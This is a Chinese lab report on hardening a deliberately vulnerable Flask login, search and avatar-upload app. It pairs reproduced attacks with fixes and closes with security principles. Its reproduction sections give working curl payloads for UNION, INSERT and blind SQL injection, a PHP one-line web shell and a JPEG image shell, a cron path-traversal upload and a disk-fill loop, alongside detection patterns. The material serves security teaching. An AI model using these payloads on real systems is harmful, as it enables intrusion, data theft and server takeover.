#### 2.2.4 头像上传（完整安全加固）

```python
# ✅ 1. 后缀白名单
ALLOWED_EXTENSIONS = {".jpg", ".jpeg", ".png", ".gif", ".webp", ".bmp"}
if ext not in ALLOWED_EXTENSIONS:
    return "不支持的文件类型"

# ✅ 2. MIME 真实类型检测（python-magic）
mime_type = magic.from_buffer(head, mime=True)
if mime_type not in ALLOWED_MIMES:
    return "文件内容不合法"

# ✅ 3. 全文件扫描图片马特征
SUSPICIOUS_PATTERNS = [b"<?php", b"eval(", b"system(", b"$_POST", b"$_GET", ...]
for pattern in SUSPICIOUS_PATTERNS:
    if pattern in content:
        return "发现可疑代码，文件内容不合法"

# ✅ 4. UUID 随机重命名（防覆盖+防路径穿越）
safe_filename = uuid.uuid4().hex + ext

# ✅ 5. 路径安全校验
save_path = UPLOAD_DIR_PATH / safe_filename
if not str(save_path.resolve()).startswith(str(UPLOAD_DIR_PATH)):
    return "非法文件名"

# ✅ 6. 用户配额控制
if get_user_upload_count(username) >= MAX_FILES_PER_USER:  # 每用户最多10个
    return "超过上传数量限制"

# ✅ 7. .htaccess 自动部署禁止脚本解析
# <FilesMatch "\.(php|phtml|asp|jsp|py|sh|exe)$"> Require all denied </FilesMatch>

# ✅ 8. 审计日志
audit_logger.info(f"用户={username} 原始文件={original_name} 保存为={safe_filename} MIME={mime_type} IP={request.remote_addr}")

# ✅ 9. 异常回滚
try: file.save(str(save_path))
except Exception:
    if save_path.exists(): save_path.unlink()
```

## 第 4 章  漏洞逐项分析与复现

### 4.1 v1.0 登录阶段漏洞

#### 漏洞 1：Debug 模式开启

- **位置**：`app.py` → `app.run(debug=True)`
- **风险**：访问不存在的路由会显示交互式调试器，可远程代码执行
- **修复**：改为 `debug=False`

#### 漏洞 2：Secret Key 硬编码

- **位置**：`app.secret_key = "dev-key-2025"`
- **风险**：攻击者可用 flask-unsign 工具伪造任意用户 Session
- **修复**：`secrets.token_hex(32)` 随机生成

#### 漏洞 3：垂直越权

```bash
# 用普通用户 alice 登录后访问管理员面板
curl -c /tmp/cookies.txt http://localhost:5000/login -d "username=alice&password=alice2025"
curl -b /tmp/cookies.txt http://localhost:5000/admin
# 🚫 漏洞版：alice 能看到管理员面板
# ✅ 修复后：HTTP 403 Forbidden
```

#### 漏洞 4：参数污染

```bash
# 发送 username[]=admin 数组参数绕过登录
curl -X POST http://localhost:5000/login -d "username[]=admin&password=admin123"
# 🚫 漏洞版：登录成功
# ✅ 修复后：返回"非法请求参数" HTTP 400
```

### 4.2 v2.0 注册/搜索阶段漏洞

#### 漏洞 13：搜索接口 UNION 注入 🔴 高危

| 项目 | 内容 |
|:----:|------|
| **位置** | `GET /search?keyword=` |
| **漏洞代码** | `f"SELECT * FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"` |
| **CVSS 3.0** | 9.8（Critical） |

```bash
# UNION 注入脱取全部用户数据（含密码明文）
curl "http://localhost:5000/search?keyword=%27%20UNION%20SELECT%201,username,password,email,phone%20FROM%20users%20--"
```

**生成 SQL**：
```sql
SELECT * FROM users WHERE username LIKE '%'
UNION SELECT 1,username,password,email,phone FROM users --%'
```

**结果**：返回全部用户数据（admin/admin123、alice/alice2025）

**修复方案**：参数化查询 `LIKE ?`

#### 漏洞 14：注册接口 INSERT 注入 🔴 高危

| 项目 | 内容 |
|:----:|------|
| **位置** | `POST /register` |
| **漏洞代码** | `f"INSERT INTO users (...) VALUES ('{username}', '{password}', ...)"` |

```bash
# 通过用户名注入 SQL 写入恶意用户
curl -X POST http://localhost:5000/register \
  -d "username=adminx'); INSERT INTO users (username,password,email,phone) VALUES ('hacker','pwd','h@x.com','666'); --&password=any&email=any&phone=any"
```

**生成 SQL**：
```sql
INSERT INTO users (...) VALUES ('adminx'); INSERT INTO users (...) VALUES ('hacker','pwd','h@x.com','666'); --', 'any', ...)
```

**结果**：成功创建 hacker 用户

**修复方案**：参数化查询 `VALUES (?, ?, ?, ?)`

#### 漏洞 15：布尔盲注提取密码 🔴 高危

```bash
# 探测 admin 密码第 1 个字符是否为 'a'（ASCII 97）
curl "http://localhost:5000/search?keyword=admin%27%20AND%20(SELECT%20unicode(substr(password,1,1))%20FROM%20users%20WHERE%20username=%27admin%27)=97%20--"
# ✅ 返回 admin 信息 → 第1个字符为 'a'

# 逐字符遍历可完整还原密码 admin123
```

**修复方案**：参数化查询，无法注入 AND 条件

### 4.3 v3.0 上传阶段漏洞

#### 漏洞 19：任意文件上传（无类型检查）🔴 高危

| 项目 | 内容 |
|:----:|------|
| **位置** | `POST /upload` |
| **漏洞代码** | `file.save(save_path)`（无任何校验） |
| **CVSS 3.0** | 9.8（Critical） |

```bash
# 上传 PHP 一句话木马
echo '<?php @eval($_POST["cmd"]); ?>' > shell.php
curl -F "file=@shell.php" http://localhost:5000/upload -b /tmp/cookies.txt
# 🚫 上传成功 → 访问 /static/uploads/shell.php 执行系统命令

# 执行命令
curl -X POST http://target/static/uploads/shell.php -d "cmd=system('id');"
# 返回: uid=0(root) gid=0(root)
```

**攻击效果**：一句话木马上传成功 → 服务器完全沦陷

**一句话木马原理拆解**：

| 代码段 | 作用 |
|--------|------|
| `<?php ... ?>` | PHP 代码标记，中间代码被执行 |
| `@` | 错误抑制符，隐藏输出防检测 |
| `eval()` | 核心危险函数，参数作 PHP 代码执行 |
| `$_POST["cmd"]` | 接收 HTTP POST 请求中 cmd 参数 |

#### 漏洞 20：MIME 类型绕过（改后缀）🔴 高危

```bash
# 将 PHP 木马改名为 .jpg（只改后缀不改内容）
echo '<?php @eval($_POST["cmd"]); ?>' > shell.jpg
curl -F "file=@shell.jpg" http://localhost:5000/upload -b /tmp/cookies.txt
# 🚫 如果只检查后缀则被绕过
```

**修复方案**：`python-magic` 读取文件头魔数，检测到真实类型为 `text/x-php`

#### 漏洞 21：图片马（JPEG/PNG隐藏木马）🔴 高危

```bash
# 创建 JPEG 文件头 + 尾部追加 PHP 代码
printf '\xff\xd8\xff\xe0\x00\x10JFIF...' > image_shell.jpg
echo '<?php @eval($_POST["cmd"]); ?>' >> image_shell.jpg

# 验证文件类型
$ file image_shell.jpg
image_shell.jpg: JPEG image data ✅
```

**原理示意**：
```
[FF D8][JFIF头][图像数据][FF D9][<?php @eval($_POST["cmd"]); ?>]
 ↑ JPEG解析到此为止 ↑          ↑ PHP从这里执行 ↑
```

**修复方案**：全文件扫描 `<?php`、`eval()`、`system()` 等可疑特征码

#### 漏洞 22：路径穿越 🔴 高危

```bash
# 文件名含 ../ 逃逸上传目录
curl -F "file=@shell.php;filename=../../../etc/cron.d/evil.php" http://localhost:5000/upload -b /tmp/cookies.txt
# 🚫 漏洞版：文件写入 /etc/cron.d/evil.php → 定时任务执行
```

**修复方案**：UUID 重命名消除用户控制 + `Path.resolve().startswith()` 校验

#### 漏洞 23：同名文件覆盖 🟡 中危

```bash
# 两次上传同名文件
curl -F "file=@avatar.png" http://localhost:5000/upload -b /tmp/cookies.txt
curl -F "file@=malicious.png;filename=avatar.png" http://localhost:5000/upload -b /tmp/cookies.txt
# 🚫 第二次静默覆盖第一次
```

**修复方案**：`uuid.uuid4().hex` 生成 32 位随机字符串作为文件名

#### 漏洞 24：磁盘填满 DoS 🟡 中危

```bash
for i in $(seq 1 100); do
  dd if=/dev/zero bs=1M count=15 > /tmp/big_$i.bin 2>/dev/null
  curl -F "file=@/tmp/big_$i.bin;filename=big_$i.bin" http://localhost:5000/upload -b /tmp/cookies.txt &
done
# 🚫 漏洞版：100个文件全部上传成功 → 磁盘空间耗尽
```

**修复方案**：每用户最多 10 个文件配额控制

#### 漏洞 25：上传目录可执行脚本 🔴 高危

- **位置**：`static/uploads/` 无防护规则
- **风险**：上传的 `.php` 文件可直接通过 HTTP 访问并被 PHP 引擎解析
- **修复**：自动生成 `.htaccess` 禁止解析可执行脚本

```apache
# static/uploads/.htaccess
<FilesMatch "\.(php|phtml|php3|php4|php5|php7|php8|asp|aspx|jsp|py|pl|cgi|sh|exe|bat|cmd)$">
    Require all denied
</FilesMatch>
Options -ExecCGI
RemoveHandler .php .phtml .php3 .php4 .php5 .php7 .php8
```

### 5.1 修复对照总表

| # | 漏洞 | 修复措施 | 关键代码 |
|:-:|------|---------|---------|
| 1 | SQL 注入（搜索） | 参数化查询 `LIKE ?` | `cur.execute("... LIKE ?", (f"%{k}%",))` |
| 2 | SQL 注入（注册） | 参数化查询 `VALUES (?,?,?,?)` | `cur.execute("INSERT ... VALUES (?,?,?,?)", ...)` |
| 3 | 密码明文存储 | scrypt 加盐哈希 | `generate_password_hash(pwd)` |
| 4 | 用户枚举 | 统一错误提示 | `"注册失败，用户名可能已存在"` |
| 5 | 任意文件上传 | 后缀白名单 | `ext in {".jpg", ".png", ...}` |
| 6 | MIME 类型绕过 | python-magic 魔数检测 | `magic.from_buffer(head, mime=True)` |
| 7 | 图片马 | 全文件内容扫描 | `if b"<?php" in content: return False` |
| 8 | 路径穿越 | UUID 重命名 + Path.resolve() | `uuid4().hex` + `startswith(UPLOAD_DIR)` |
| 9 | 同名文件覆盖 | UUID 随机命名 | `uuid.uuid4().hex + ext` |

| 13 | 上传失败无回滚 | try-except 异常清理 | `if exists: os.remove()` |

### 5.2 核心修复代码

#### 5.2.1 文件后缀白名单

```python
ALLOWED_EXTENSIONS = {".jpg", ".jpeg", ".png", ".gif", ".webp", ".bmp"}

def allowed_extension(filename):

    return ext in ALLOWED_EXTENSIONS
```

#### 5.2.2 MIME 真实类型检测 + 图片马扫描

```python
ALLOWED_MIMES = {"image/jpeg", "image/png", "image/gif", "image/bmp", "image/webp"}
SUSPICIOUS_PATTERNS = [b"<?php", b"<?=", b"eval(", b"system(", b"exec(",
                       b"assert(", b"$_POST", b"$_GET", b"$_REQUEST",
                       b"shell_exec", b"passthru", b"popen(", b"base64_decode"]

def allowed_mime(file_obj):
    head = file_obj.read(2048); file_obj.seek(0)
    mime_type = magic.from_buffer(head, mime=True)
    if mime_type not in ALLOWED_MIMES:
        return False, mime_type
    # 全文件扫描图片马特征
    content = file_obj.read(); file_obj.seek(0)
    for pattern in SUSPICIOUS_PATTERNS:
        if pattern in content:
            return False, f"{mime_type} (发现可疑代码: {pattern.decode(errors='ignore')})"
    return True, mime_type
```

### 8.2 核心安全原则

1. **永远不要使用字符串拼接构造 SQL** → 必须用参数化查询（`?` 占位符）
3. **密码绝不能明文存储** → 必须加盐哈希（scrypt / bcrypt）
4. **永远不要信任用户上传的文件名** → 使用 UUID 重命名
5. **永远不要信任文件扩展名** → 用 MIME 魔数检测真实类型
6. **图片也要扫描恶意代码** → 图片马是常见绕过手段
7. **上传目录必须禁止脚本解析** → .htaccess 或 Nginx 规则
8. **限制用户资源配额** → 防 DoS 攻击
9. **所有操作记录审计日志** → 安全事件可溯源
10. **用户输入永远不可信** → 所有输入都可能是攻击 payload
